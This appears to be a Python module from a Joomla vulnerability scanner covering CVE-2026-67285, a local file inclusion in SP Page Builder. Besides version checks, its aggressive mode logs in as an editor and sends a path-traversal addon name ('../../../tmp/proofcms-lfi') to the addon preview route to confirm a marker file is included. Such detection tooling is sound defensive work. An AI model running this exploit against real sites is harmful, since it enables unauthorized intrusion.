from __future__ import annotations

import re
from typing import Any
from urllib.parse import urlencode

from ...core.http import (
    HttpClient,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-67285"
NAME = "SP Page Builder authenticated addon-name local PHP file inclusion"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.7.0; fixed in 6.8.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PAGE = "/index.php?option=com_users&view=login"
LOGIN_POST = "/index.php?option=com_users&task=user.login"
AJAX_PATH = "/index.php?option=com_sppagebuilder&task=ajax"
JSON_VIEW_PATH = "/index.php?option=com_sppagebuilder&view=ajax&format=json&callback=addon"
BENIGN_ADDON = "text_block"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.8.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}, within the affected range below 6.8.0. The addon preview builds an include path from the request-supplied addon name."
        action = "Upgrade SP Page Builder to 6.8.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which restricts addon names to a bare directory name."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.8.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    """Log into the Joomla site with a user holding core.edit on SPPB."""
    page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    if is_transport_error(page):
        return False
    token = extract_csrf_from_html(str(page.get("body") or ""))
    if not token:
        return False
    response = client.request(
        f"{base}{LOGIN_POST}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(
            {
                "username": username,
                "password": password,
                "remember": "0",
                "return": "",
                token: "1",
            }
        ),
        timeout=timeout,
        follow_redirects=False,
    )
    if is_transport_error(response):
        return False
    location = str((response.get("headers") or {}).get("Location") or "")
    if response.get("status") in (301, 302, 303) and "login" not in location.lower():
        return True
    body = str(response.get("body") or "")
    return "logout" in body.lower() or "profile" in location.lower()


def _post_addon(
    client: HttpClient,
    url: str,
    addon_name: str,
    csrf_token: str,
    timeout: int,
) -> dict[str, Any]:
    """Send the editor addon preview request with a nested addon array."""
    fields: dict[str, str] = {
        "addon[name]": addon_name,
        "addon[settings][title]": "ProofCMS",
        "addon[type]": "text_block",
    }
    if csrf_token:
        fields[csrf_token] = "1"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if csrf_token:
        headers["X-CSRF-Token"] = csrf_token
    return client.request(url, method="POST", headers=headers, data=form_encode(fields), timeout=timeout)


def run_aggressive_probe(
    target_url: str,
    addon: str = "../../../tmp/proofcms-lfi",
    marker: str = "PROOFCMS_LFI_MARKER",
    username: str | None = None,
    password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Include the local marker through the editor's addon preview route.

    On 6.7.0 and earlier, ``view=ajax&format=json&callback=addon`` calls
    ``AddonParser::getAddonPath($_POST['addon']['name'])`` and then
    ``require_once $addon_path . '/site.php'``. Joomla 5 dispatches this
    legacy view only for a user with ``core.edit`` on com_sppagebuilder, so
    the probe logs in first. 6.8.0+ allowlists bare addon directory names.
    """
    base = normalize_url(target_url)
    proof_url = f"{base}{JSON_VIEW_PATH}"
    if not username or not password:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail=(
                "The addon preview needs a Joomla editor session. Pass --aggressive-arg username=... "
                "password=... on an authorized staging site. Nothing was sent."
            ),
            action="Re-run with the lab editor credentials.",
        )

    client = HttpClient(timeout=timeout, proxy=proxy)
    if not _login(client, base, username, password, timeout):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{LOGIN_PAGE}",
            detail="The editor login did not establish a session; the addon include was not attempted.",
            action="Verify the lab credentials and the site login route.",
        )

    home = client.get(f"{base}/index.php", timeout=timeout)
    csrf_token = "" if is_transport_error(home) else (extract_csrf_from_html(str(home.get("body") or "")) or "")

    control = _post_addon(client, proof_url, BENIGN_ADDON, csrf_token, timeout)
    if is_transport_error(control):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=proof_url,
            detail=f"The benign addon preview failed in transit ({transport_error_detail(control)}).",
            action="Retry when the target is reachable.",
        )
    control_body = str(control.get("body") or "")
    control_ok = control.get("status") == 200 and "sppb-addon-wrapper" in control_body

    responses: list[dict[str, Any]] = []
    traversal = _post_addon(client, proof_url, addon, csrf_token, timeout)
    responses.append({"route": "json-view", "response": traversal})
    if not is_transport_error(traversal) and marker not in str(traversal.get("body") or ""):
        # Older Joomla branches can expose the addon include through the
        # public ajax task instead of the legacy JSON view.
        ajax_url = f"{base}{AJAX_PATH}&{urlencode({'addon': addon})}"
        legacy = client.get(ajax_url, timeout=timeout)
        responses.append({"route": "ajax-task", "response": legacy})

    marker_found = any(
        not is_transport_error(item["response"]) and marker in str(item["response"].get("body") or "")
        for item in responses
    )
    evidence = {
        "addon": addon,
        "marker": marker,
        "benign_addon": BENIGN_ADDON,
        "benign_status": control.get("status"),
        "benign_preview_ok": control_ok,
        "csrf_token_used": bool(csrf_token),
        "marker_found": marker_found,
        "attempts": [
            {"route": item["route"], "status": item["response"].get("status"), "body_length": len(str(item["response"].get("body") or ""))}
            for item in responses
        ],
    }
    if marker_found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            detail="The addon name traversed out of the addon directory and the editor preview included the local marker file.",
            action="Upgrade SP Page Builder to 6.8.0 or newer.",
        )
    if not control_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            detail="The benign addon preview did not render, so the editor route is unavailable on this fixture (missing core.edit, CSRF token, or an incompatible view dispatcher).",
            action="Confirm the editor session and the addon preview route before retrying.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=proof_url,
        evidence=evidence,
        detail="The editor preview rendered a benign addon but did not include the traversal marker; 6.8.0+ restricts addon names to bare directory names.",
        action="Upgrade affected SP Page Builder versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_sppagebuilder"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The component page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The component is reachable; the traversal payload was not sent in safe mode.", action="Use aggressive mode with editor credentials and a local site.php marker on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            addon=aggressive_value(aggressive_args, aggressive_command, "addon") or "../../../tmp/proofcms-lfi",
            marker=aggressive_value(aggressive_args, aggressive_command, "marker") or "PROOFCMS_LFI_MARKER",
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (addon traversal) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Local File Inclusion", "module_version": "1.1.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-67285", "https://www.joomshaper.com", "https://mysites.guru/vulnerabilities/CVE-2026-67285"]}
